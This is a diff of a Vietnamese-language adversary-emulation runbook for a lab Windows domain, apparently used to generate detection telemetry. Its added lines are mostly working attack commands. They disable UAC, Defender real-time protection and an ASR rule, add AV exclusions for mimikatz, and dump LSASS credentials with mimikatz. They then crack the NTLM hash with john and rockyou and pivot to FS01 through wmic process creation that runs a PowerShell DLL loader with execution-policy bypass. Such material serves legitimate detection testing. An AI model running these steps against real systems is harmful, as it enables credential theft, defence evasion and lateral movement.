@@ -31,10 +31,21 @@ Copy-Item payloads\config\c0015-phase7.example.ini stage\ws01\config-phase7.ini
 notepad stage\ws01\config-phase7.ini        # run_id=RUN-20260928-02
 # tắt AV vĩnh viễn (mỗi VM) — xem docs/attack-runbook.md step 4 (Tamper OFF -> policy -> prefs -> Get-MpComputerStatus)
 ```
-### [WS01 + FS01] — gates (mỗi máy)
+### [WS01 + FS01] — gates (mỗi máy, tất cả BẮT BUỘC)
 ```powershell
-runas /user:C0015\it.admin "cmd /c whoami /groups"     # phải có SeDebugPrivilege = it.admin ∈ local Administrators
-where wmic                                              # WS01 (bản 24H2+ không có -> dùng CIM, ghi PARTIAL)
+# it.admin ∈ local Administrators CẢ 2 máy (mới có SeDebug + WMI/C$ tới FS01):
+runas /user:C0015\it.admin "cmd /c whoami /groups"     # phải có SeDebugPrivilege
+net localgroup Administrators C0015\it.admin /add      # (nếu thiếu, trên máy đó)
+# [WS01] tắt UAC filtered token (kẻo runas it.admin mất SeDebug):
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f   # + REBOOT WS01
+# [C2 + WS01 + FS01] Tamper Protection OFF rồi:
+Set-MpPreference -AttackSurfaceReductionRules_Ids "d1e49aac-8f56-4280-b9aa-9936ba642ffc" -AttackSurfaceReductionRules_Actions Disabled
+Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionProcess pwsh.exe,powershell.exe,cmd.exe,wmic.exe,rundll32.exe,mimikatz.exe
+Add-MpPreference -ExclusionPath C:\C0015,C:\stage,C:\Tools,C:\Users\Public\C0015,C:\ProgramData\C0015,E:\lab
+# [FS01] mở inbound WMI (S8b WMI pivot):
+Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled True
+# mọi máy:
 & C:\Tools\sysmon64.exe -c C:\Tools\sysmon-c0015-balanced.xml
 ```
 ### [WS01] — đặt file stage trước
@@ -97,20 +108,22 @@ net use \\FS01\IPC$ /user:C0015\it.admin *        # B. allowed -> S4648 + FS01 4
 net use \\FS01\IPC$ /user:C0015\<revoked> *       # C. denied
 net use \\FS01\IPC$ /delete
 ```
-**S7b — LSASS dump thật:**
+**S7b — LSASS dump thật (chạy TƯƠNG TÁC trong console elevated — beacon/`cmd /c` không điều khiển được REPL của mimikatz):**
 ```powershell
 copy C:\stage\mimikatz.exe C:\Tools\
-runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"
-# trong output: tìm dòng it.admin -> LẤY NTLM hash (Win hiện đại không có plaintext)
+runas /user:C0015\it.admin "cmd /k C:\Tools\mimikatz.exe"
+# trong console mimikatz:  privilege::debug  ->  sekurlsa::logonpasswords
+# lấy dòng it.admin -> NTLM hash (Win hiện đại không có plaintext)
 ```
-**[KALI] — crack:**
+**[KALI] — crack (dùng john — Kali không có OpenCL cho hashcat):**
 ```bash
 echo -n '<NTLM_HASH>' > /tmp/itadmin.ntlm
-sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
-hashcat -m 1000 /tmp/itadmin.ntlm /usr/share/wordlists/rockyou.txt --show
-# hoặc: john --format=nt /tmp/itadmin.ntlm --wordlist=/usr/share/wordlists/rockyou.txt
+john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/itadmin.ntlm
+john --format=nt --show /tmp/itadmin.ntlm      # rockyou không ra -> dùng plaintext đã provision
 rm -f /tmp/itadmin.ntlm     # giá trị chỉ ở trong bộ nhớ operator; KHÔNG vào repo/log
 ```
+> Lưu ý: nếu `sekurlsa::logonpasswords` báo `Handle on memory (0x00000005)` → thiếu SeDebugPrivilege
+> (chưa thêm Administrators / chưa EnableLUA=0) hoặc PPL bật (`RunAsPPL` — lab không có).
 **S8a — tool handoff (C:\stage trên WS01):**
 ```powershell
 New-Item -Force -ItemType Directory \\FS01\C$\C0015
@@ -118,13 +131,14 @@ copy C:\stage\c0015_143_surrogate.dll \\FS01\C$\C0015\
 copy C:\stage\c0015_beacon.ps1            \\FS01\C$\C0015\
 copy C:\stage\config-phase7.ini           \\FS01\C$\C0015\config-phase7.ini
 ```
-**S8b — WMI pivot (dùng PLAINTEXT CRACKED ở prompt runas):**
+**S8b — WMI pivot (T1047, giữ ĐÚNG kỹ thuật; host con là console-loader vì rundll32 không load được DLL trong
+session-0 của WMI — `ReturnValue=9`, đã chứng minh):**
 ```powershell
-runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""
-# fallback nếu không có wmic:
-$cred = Get-Credential C0015\it.admin
-Invoke-CimMethod -ClassName Win32_Process -MethodName Create -ComputerName FS01 -Credential $cred `
-  -Arguments @{ CommandLine = 'rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry' }   # ghi PARTIAL
+# tạo loader trên FS01 (admin) — PowerShell P/Invoke LoadLibrary/GetProcAddress chính file
+#   C:\C0015\c0015_143_surrogate.dll -> gọi LabEntry:  C:\C0015\s8b_loader.ps1
+# WMI pivot (WS01 elevated; password ở prompt):
+runas /user:C0015\it.admin "cmd /k wmic /node:FS01 process call create \"cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -File C:\C0015\s8b_loader.ps1\""
+# -> ReturnValue=0, ProcessId=<pid> (run RUN-20260930-01: 964)
 ```
 ### [C2] — artifacts + chờ S9
 ```powershell
@@ -135,7 +149,8 @@ pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-
 Get-ChildItem evidence\run-ledger | Sort-Object LastWriteTime | Select-Object -Last 5   # ART-07-01-<token8>.json
 Get-Content c2sim.log -Tail 15                                    # register phase7-session2 ok=True + T-DISCOVER-CORPUS
 ```
-◉ Elastic FS01: E1 rundll32 (cùng ProcessGuid S8b) → **E7** `C:\C0015\c0015_143_surrogate.dll` (hash=ART-06-01) → E11 `c0015_143-executed.txt` → E3 `:8080`. Chốt = receipt + callback cùng run.
+◉ Elastic FS01: E1 `cmd/powershell` (console-loader, parent `wmiprvse.exe`) → **E7** `C:\C0015\c0015_143_surrogate.dll`
+(hash=ART-06-01, load bởi loader host) → E11 `c0015_143-executed.txt` → E3 `:8080`. Chốt = receipt + callback cùng run.
 
 ---
 
@@ -176,6 +191,6 @@ pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Stop
 Remove-Item -Recurse -Force C:\Users\Public\C0015, "$env:USERPROFILE\Desktop\test.docm"
 # FS01 + WS01:
 Remove-Item -Recurse -Force C:\C0015 ; Remove-Item C:\Tools\mimikatz.exe -Force
-# Ctrl+C cửa sổ S0; bật lại Defender (gỡ policy, bật Tamper Protection, Update-MpSignature)
+# Ctrl+C cửa sổ S0; bật lại Defender + ASR rule + Tamper Protection + re-enable WMI firewall block
 ```
 Verify queries + join keys: `docs/phase2-detection-prep-s4-s9.md` · `docs/run-phase2-checklist.md`.
